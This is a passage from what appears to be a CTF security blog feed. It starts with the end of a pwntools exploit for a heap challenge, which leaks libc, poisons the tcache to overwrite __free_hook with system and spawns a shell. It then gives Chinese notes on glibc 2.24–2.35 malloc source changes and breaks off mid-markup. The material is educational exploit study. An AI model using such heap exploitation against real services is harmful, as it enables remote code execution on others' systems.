class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./new&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30170</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br>show(<span class="hljs-number">7</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i)<br>delete(<span class="hljs-number">7</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,p64(free_hook))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x20</span>,p64(system_addr))<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.24-2.35堆相关源码阅读笔记</title>
    <link href="/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/"/>
    <url>/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<p>源码阅读笔记计划之二！范围是2.24——2.35glibc的malloc.c源码（仅包含源码的变化部分的解析）<br>ps：偷了个懒只分析了我感觉有影响的变化(●ˇ∀ˇ●)</p><span id="more"></span><h1 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h1><ul><li>MALLOC_ALIGNMENT定义改变<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MALLOC_ALIGNMENT</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta"> ? __alignof__ (long double) : 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>增加了宏DUMPED_MAIN_ARENA_CHUNK(p)，验证mmap的内存。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* These variables are used for undumping support.  Chunked are marked</span><br><span class="hljs-comment">   as using mmap, but we leave them alone if they fall into this</span><br><span class="hljs-comment">   range.  NB: The chunk size for these chunks only includes the</span><br><span class="hljs-comment">   initial size field (of SIZE_SZ bytes), there is no trailing size</span><br><span class="hljs-comment">   field (unlike with regular mmapped chunks).  */</span><br><span class="hljs-type">static</span> mchunkptr dumped_main_arena_start; <span class="hljs-comment">/* Inclusive.  */</span><br><span class="hljs-type">static</span> mchunkptr dumped_main_arena_end;   <span class="hljs-comment">/* Exclusive.  */</span><br><br><span class="hljs-comment">/* True if the pointer falls into the dumped arena.  Use this after</span><br><span class="hljs-comment">   chunk_is_mmapped indicates a chunk is mmapped.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DUMPED_MAIN_ARENA_CHUNK(p) \</span><br><span class="hljs-meta">  ((p) &gt;= dumped_main_arena_start &amp;&amp; (p) &lt; dumped_main_arena_end)</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h1><p>增加了一些方便使用的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br></code></pre></td></tr></table></figure><h1 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h1><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcache相关宏定义"><a href="#tcache相关宏定义" class="headerlink" title="tcache相关宏定义"></a>tcache相关宏定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="tcache相关函数和结构体"><a href="#tcache相关函数和结构体" class="headerlink" title="tcache相关函数和结构体"></a>tcache相关函数和结构体</h3><p>tcache实现主要结构体tcache_perthread_struct放在堆的开头（也是一个chunk）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br><span class="hljs-comment">//tcache_entry指针指向的是chunk的data部分！！！</span><br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">//断言错误，本意是检查counts&gt;0是否成立，可能会造成负数溢出</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br><br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br><br>  arena_get (ar_ptr, bytes);<br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  <span class="hljs-keyword">if</span> (victim)<br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE()</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="libc-malloc函数变化"><a href="#libc-malloc函数变化" class="headerlink" title="__libc_malloc函数变化"></a>__libc_malloc函数变化</h3><p>开头增加tcache初始化和如果tcache非空则从tcache中取chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes = request2size (bytes);<span class="hljs-comment">//不安全</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>……<br><br>  MAYBE_INIT_TCACHE ();<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-malloc函数变化"><a href="#int-malloc函数变化" class="headerlink" title="_int_malloc函数变化"></a>_int_malloc函数变化</h3><h4 id="fastbins的操作进行之前"><a href="#fastbins的操作进行之前" class="headerlink" title="fastbins的操作进行之前"></a>fastbins的操作进行之前</h4><p>如果chunk的大小符合要求，并且对应的bins还没装满，就将其放进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);\</span><br><span class="hljs-meta"></span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp = *fb;<br>      REMOVE_FB (fb, victim, pp);<span class="hljs-comment">//返回victim（fastbin最后一个chunk）</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  REMOVE_FB (fb, tc_victim, pp);<span class="hljs-comment">//移动至fastbin最后一个chunk</span><br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      tcache_put (tc_victim, tc_idx);<span class="hljs-comment">//每次将fastbin最后一个chunk放进tcache</span><br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="small-bin中同上"><a href="#small-bin中同上" class="headerlink" title="small bin中同上"></a>small bin中同上</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br>              check_malloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span 